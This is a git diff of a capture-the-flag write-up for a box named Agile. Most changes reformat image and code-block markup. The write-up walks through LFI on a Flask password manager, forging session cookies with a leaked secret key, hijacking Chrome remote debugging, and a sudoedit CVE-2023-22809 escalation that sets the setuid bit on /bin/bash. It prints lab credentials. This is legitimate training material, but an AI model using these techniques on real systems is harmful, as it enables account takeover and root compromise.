@@ -21,15 +21,15 @@ We need to add `superpass.htb` to our `/etc/hosts` file to access port 80.
 
 The website advertised a password manager.
 
-<figure><img src="../../.gitbook/assets/image (3117).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3117).png>)
 
 I tested by registering a user to see what functionalities this application has. I registed a username and got an error, revealing that this is a Flask application. Not sure if this was supposed to happen
 
-<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(588).png>)
 
 Anyways, when I tried again it worked and brought me to a dashboard where I can add a password and Export passwords.
 
-<figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(288).png>)
 
 The Export function looks rather exploitable. I added some passwords, then tried to download the file and was presented with this HTTP request:
 
@@ -47,7 +47,7 @@ Upgrade-Insecure-Requests: 1
 
 The `fn` paramete was vulnerable to LFI.
 
-<figure><img src="../../.gitbook/assets/image (833).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(833).png>)
 
 We find 4 users, `runner`, `corum`, `edwards`, and `dev_admin`. We know that this is a Flask application, so the source code for `app.py` is probably in some `/app/app/main` directory or something along those lines.  Some testing revealed that it was located in `../app/app/superpass/app.py`.
 
@@ -61,12 +61,10 @@ app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76j
 
 Now that we have the SECRET\_KEY, we can decrypt the cookie.
 
-{% code overflow="wrap" %}
 ```
 $ flask-unsign --decode --cookie '.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZAX6Tg.txUnjeEEeD_3BB80vD96et6vwwU' --secret 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
 {'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '9'}
 ```
-{% endcode %}
 
 Now, we can change the `_user_id` parameter and hopefully login as other users with stored passwords. We can keep changing the user ID to anything we want and keep getting different passwords. Here are some interesting ones:
 
@@ -84,7 +82,7 @@ Now, we can change the `_user_id` parameter and hopefully login as other users w
 
 That last one for `corum` is a valid password for SSH.
 
-<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(439).png>)
 
 Then we can easily grab the user flag.
 
@@ -94,11 +92,9 @@ Then we can easily grab the user flag.
 
 I ran a LinPEAS scan and thsi was the one thing that stood out the most:
 
-{% code overflow="wrap" %}
 ```
 runner      3486  0.1  2.5 34023392 103408 ?     Sl   14:49   0:00                      _ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.MLKYLq --window-size=1420,1080 data:
 ```
-{% endcode %}
 
 It would appear that there is a --remote-debugging-port being used. Essentially, it means that this port is open and running Chrome. With credentials for SSH, we can port forward this and perhaps access it from our machine to see what the user is doing.
 
@@ -114,15 +110,15 @@ Afterwards, we can use Burpsuite's Chromium browser (that is in-built) to access
 
 Just add `localhost:41829` to the Discover Network Targets portion, and we will pick up on the target.
 
-<figure><img src="../../.gitbook/assets/image (1838).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1838).png>)
 
 We can inspect this to basically spy on the user.
 
-<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(969).png>)
 
 I visited the `/vault` directory and found some secret credentials.
 
-<figure><img src="../../.gitbook/assets/image (2851).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2851).png>)
 
 Then, we can `su` to `edwards`.
 
@@ -145,25 +141,21 @@ User edwards may run the following commands on agile:
 
 In short, we edit some files as `dev_admin`. I read files and found some credentials
 
-{% code overflow="wrap" %}
 ```
 # creds.txt
 edwards:1d7ffjwrx#$d6qn!9nndqgde4
 # config_test.json
 "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
 ```
-{% endcode %}
 
 However, the credentials here lead to dead ends, with the SQL database having nothing of interest. I ran a `pspy64` to see if there were any exploitable processes. This one line looked rather suspicious because `dev_admin` had write access to it:
 
-{% code overflow="wrap" %}
 ```
 2023/03/06 15:16:01 CMD: UID=0    PID=37141  | /bin/bash -c source /app/venv/bin/activate 
 
 edwards@agile:/tmp$ ls -la /app/venv/bin/activate
 -rw-rw-r-- 1 root dev_admin 1976 Mar  6 15:15 /app/venv/bin/activate
 ```
-{% endcode %}
 
 Checking the `sudo` version online, I found that it was vulnerable to CVE-2023-22809.
 
@@ -180,4 +172,4 @@ sudo -u dev_admin sudoedit /app/config_test.json
 
 This opens up the `activate` file and we are free to edit it. We can add `chmod u+s /bin/bash` into it. Then we can easily become `root`.
 
-<figure><img src="../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(565).png>)
